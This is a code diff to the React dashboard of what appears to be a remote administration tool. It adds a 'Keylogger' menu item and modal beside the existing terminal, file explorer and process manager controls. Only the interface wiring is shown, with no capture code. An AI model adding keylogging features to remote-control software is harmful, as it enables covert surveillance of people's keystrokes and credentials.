@@ -15,6 +15,7 @@ let ComponentMap = {
 	ProcMgr: null,
 	Desktop: null,
 	Execute: null,
+	Keylogger: null,
 };
 
 function overview(props) {
@@ -25,6 +26,7 @@ function overview(props) {
 	const [explorer, setExplorer] = useState(false);
 	const [generate, setGenerate] = useState(false);
 	const [terminal, setTerminal] = useState(false);
+	const [keylogger, setKeylogger] = useState(false);
 	const [screenBlob, setScreenBlob] = useState('');
 	const [dataSource, setDataSource] = useState([]);
 
@@ -170,13 +172,13 @@ function overview(props) {
 
 	useEffect(() => {
 		// auto update is only available when all modal are closed.
-		if (!execute && !desktop && !procMgr && !explorer && !generate && !terminal) {
+		if (!execute && !desktop && !procMgr && !explorer && !generate && !terminal && !keylogger) {
 			let id = setInterval(getData, 3000);
 			return () => {
 				clearInterval(id);
 			};
 		}
-	}, [execute, desktop, procMgr, explorer, generate, terminal]);
+	}, [execute, desktop, procMgr, explorer, generate, terminal, keylogger]);
 
 	function renderCPUStat(cpu) {
 		let { model, usage, cores } = cpu;
@@ -264,6 +266,7 @@ function overview(props) {
 			<a key='terminal' onClick={() => onMenuClick('terminal', device)}>{i18n.t('OVERVIEW.TERMINAL')}</a>,
 			<a key='explorer' onClick={() => onMenuClick('explorer', device)}>{i18n.t('OVERVIEW.EXPLORER')}</a>,
 			<a key='procmgr' onClick={() => onMenuClick('procmgr', device)}>{i18n.t('OVERVIEW.PROC_MANAGER')}</a>,
+			<a key='keylogger' onClick={() => onMenuClick('keylogger', device)}>Keylogger</a>,
 			<TableDropdown
 				key='more'
 				onSelect={key => onMenuClick(key, device)}
@@ -281,6 +284,7 @@ function overview(props) {
 			procmgr: setProcMgr,
 			execute: setExecute,
 			desktop: setDesktop,
+			keylogger: setKeylogger,
 		};
 		if (hooksMap[act]) {
 			setLoading(true);
@@ -426,6 +430,13 @@ function overview(props) {
 					open={terminal}
 					device={terminal}
 					onCancel={setTerminal.bind(null, false)}
+				/>
+			}
+			{
+				ComponentMap.Keylogger &&
+				<ComponentMap.Keylogger
+					device={keylogger}
+					onClose={setKeylogger.bind(null, false)}
 				/>
 			}
 			<ProTable
